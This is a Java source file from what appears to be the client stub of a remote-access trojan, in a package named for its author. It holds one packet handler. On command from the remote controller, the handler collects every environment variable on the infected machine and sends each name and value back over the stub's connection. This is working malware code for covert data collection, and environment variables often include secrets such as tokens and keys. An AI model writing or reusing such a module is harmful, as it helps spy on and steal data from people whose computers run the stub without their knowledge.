package com.redpois0n.stub.packets.incoming;

import java.util.Set;

import com.redpois0n.stub.Connection;


public class Packet96EnvironmentVariables extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Set<String> set = System.getenv().keySet();
		for (String str : set) {
			Connection.writeLine("VARPROP");
			Connection.writeLine(str);
			Connection.writeLine(System.getenv(str));
		}
	}

}
